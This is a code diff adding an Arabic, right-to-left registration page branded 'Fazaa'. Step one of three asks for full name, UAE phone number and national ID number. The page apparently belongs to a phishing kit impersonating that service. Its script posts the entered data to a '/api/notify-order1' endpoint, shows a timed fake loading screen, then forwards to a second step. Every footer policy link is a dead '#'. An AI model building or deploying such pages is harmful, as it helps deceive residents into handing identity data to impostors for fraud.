@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فزعة - التسجيل</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container header-content">
+            <div class="logo">
+                <img src="/images/logo.png" alt="Fazaa">
+            </div>
+            <nav class="nav">
+                <a href="#" class="lang-toggle" id="langToggle" onclick="toggleLanguage(); return false;">English</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Content -->
+    <main class="order-page">
+        <div class="container">
+            <div class="order-form">
+                <div class="order-header">
+                    <h1>المعلومات الشخصية</h1>
+                    <p>يرجى إدخال بياناتك بشكل صحيح</p>
+                </div>
+
+                <!-- Step Indicator -->
+                <div class="steps-indicator">
+                    <div class="step active">
+                        <div class="step-number">1</div>
+                        <div class="step-label">معلومات شخصية</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-label">العنوان</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-label">اشترك</div>
+                    </div>
+                </div>
+
+                <form id="orderForm1">
+                    <div class="form-group">
+                        <label>الاسم الكامل <span class="required">*</span></label>
+                        <input type="text" id="fullName" placeholder="يرجى إدخال الاسم" required>
+                        <span class="error-msg" id="fullNameError">هذا الحقل مطلوب</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label>رقم الهاتف <span class="required">*</span></label>
+                        <div class="phone-wrapper">
+                            <span class="phone-prefix">+971</span>
+                            <input type="tel" id="phoneNumber" class="phone-input" placeholder="5xxxxxxxx" required>
+                        </div>
+                        <span class="error-msg" id="phoneError">رقم الهاتف غير صحيح</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label>رقم الهوية <span class="required">*</span></label>
+                        <input type="text" id="nationalId" placeholder=" " required>
+                        <span class="error-msg" id="nationalIdError">رقم الهوية غير صحيح   </span>
+                    </div>
+
+                    <button type="submit" class="btn-primary">المتابعة <i class="fas fa-arrow-left"></i></button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container footer-content">
+            <div class="footer-brand">
+                <span class="brand-name">فزعة</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">سياسة الخصوصية</a>
+                <a href="#">شروط الخدمة</a>
+                <a href="#">الدعم</a>
+                <a href="#">الأسئلة الشائعة</a>
+            </div>
+            <div class="footer-copyright">
+                <p>© 2026 فزعة. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/js/main.js"></script>
+    <script src="/js/i18n.js"></script>
+    <style>
+        .order-page { min-height: calc(100vh - 200px); display: flex; align-items: center; justify-content: center; padding: 20px 0 40px; background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%); }
+        .order-form { background: #fff; border-radius: 20px; padding: 40px; width: 100%; max-width: 500px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); margin-top: 0; }
+        .order-header { text-align: center; margin-bottom: 20px; }
+        .order-header h1 { font-size: 1.8rem; color: #1a1a2e; margin-bottom: 8px; }
+        .order-header p { color: #666; font-size: 0.95rem; }
+        .steps-indicator { display: flex; justify-content: center; align-items: center; margin-bottom: 35px; }
+        .step { text-align: center; }
+        .step-number { width: 45px; height: 45px; border-radius: 50%; background: #e0e0e0; color: #666; display: flex; align-items: center; justify-content: center; font-weight: 700; margin: 0 auto 8px; }
+        .step.active .step-number { background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; }
+        .step.completed .step-number { background: #28a745; color: #fff; }
+        .step-label { font-size: 0.85rem; color: #666; }
+        .step.active .step-label { color: #8B1538; font-weight: 600; }
+        .step-line { width: 50px; height: 3px; background: #e0e0e0; margin: 0 10px; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
+        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 1rem; font-family: inherit; transition: all 0.3s; }
+        .form-group input:focus { outline: none; border-color: #8B1538; }
+        .error-msg { color: #dc3545; font-size: 0.85rem; margin-top: 6px; display: none; }
+        .error-msg.show { display: block; }
+        .required { color: #dc3545; }
+        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(139,21,56,0.3); }
+        [dir="ltr"] .btn-primary i { transform: scaleX(-1); }
+        
+        /* تنسيق حقل الهاتف المدمج مع رمز الدولة */
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .phone-wrapper:focus-within {
+            border-color: #8B1538;
+        }
+        
+        .phone-prefix {
+            padding: 14px 15px;
+            background: #e8e8e8;
+            color: #666;
+            font-weight: 600;
+            font-size: 1rem;
+            white-space: nowrap;
+            border-left: 1px solid #d0d0d0;
+        }
+        
+        [dir="rtl"] .phone-prefix {
+            border-left: none;
+            border-right: 1px solid #d0d0d0;
+        }
+        
+        .phone-input {
+            flex: 1;
+            padding: 14px 16px;
+            border: none !important;
+            background: transparent;
+            font-size: 1rem;
+            font-family: inherit;
+            outline: none;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        [dir="rtl"] .phone-input {
+            text-align: right;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 15, 25, 0.65);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            padding: 20px;
+        }
+
+        .loading-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px 28px;
+            text-align: center;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-spinner {
+            width: 46px;
+            height: 46px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #8B1538;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .loading-text {
+            font-size: 0.95rem;
+            color: #555;
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .order-page {
+                padding: 20px 0;
+                min-height: auto;
+            }
+            .container {
+                padding: 0 12px;
+            }
+            .order-form {
+                padding: 24px 18px;
+                border-radius: 16px;
+                max-width: 100%;
+            }
+            .order-header h1 {
+                font-size: 1.4rem;
+            }
+            .order-header p {
+                font-size: 0.9rem;
+            }
+            .steps-indicator {
+                gap: 6px;
+                flex-wrap: wrap;
+                margin-bottom: 24px;
+            }
+            .step-line {
+                width: 20px;
+                margin: 0 4px 18px;
+            }
+            .step-label {
+                font-size: 0.75rem;
+            }
+            .form-group {
+                margin-bottom: 16px;
+            }
+            .form-group input {
+                padding: 12px 14px;
+                font-size: 0.95rem;
+            }
+            .phone-prefix {
+                padding: 12px 12px;
+                font-size: 0.95rem;
+            }
+            .phone-input {
+                padding: 12px 12px;
+            }
+            .btn-primary {
+                padding: 13px;
+                font-size: 0.95rem;
+            }
+        }
+    </style>
+    <script>
+        function showLoadingOverlay() {
+            if (document.getElementById('loadingOverlay')) return;
+            var overlay = document.createElement('div');
+            overlay.id = 'loadingOverlay';
+            overlay.className = 'loading-overlay';
+            overlay.innerHTML = '<div class="loading-card"><div class="loading-spinner"></div><div class="loading-text">جار التحميل يرجى الانتظار</div></div>';
+            document.body.appendChild(overlay);
+        }
+
+        document.getElementById('orderForm1').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var fullName = document.getElementById('fullName').value.trim();
+            var phoneNumber = document.getElementById('phoneNumber').value.trim();
+            var nationalId = document.getElementById('nationalId').value.trim();
+            var isValid = true;
+            
+            if (!fullName) { document.getElementById('fullNameError').classList.add('show'); isValid = false; }
+            else { document.getElementById('fullNameError').classList.remove('show'); }
+            
+            if (!phoneNumber) { document.getElementById('phoneError').classList.add('show'); isValid = false; }
+            else { document.getElementById('phoneError').classList.remove('show'); }
+            
+            if (!nationalId) { document.getElementById('nationalIdError').classList.add('show'); isValid = false; }
+            else { document.getElementById('nationalIdError').classList.remove('show'); }
+            
+            if (!isValid) return;
+            
+            showLoadingOverlay();
+            sessionStorage.setItem('step1', JSON.stringify({ fullName: fullName, phoneNumber: phoneNumber, nationalId: nationalId }));
+            fetch('/api/notify-order1', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ stage: 'order1', fullName: fullName, phoneNumber: phoneNumber, nationalId: nationalId })
+            }).catch(function() {
+                console.log('notify-order1 failed');
+            });
+            setTimeout(function() {
+                window.location.href = '/order2';
+            }, 2200);
+        });
+    </script>
+</body>
+</html>
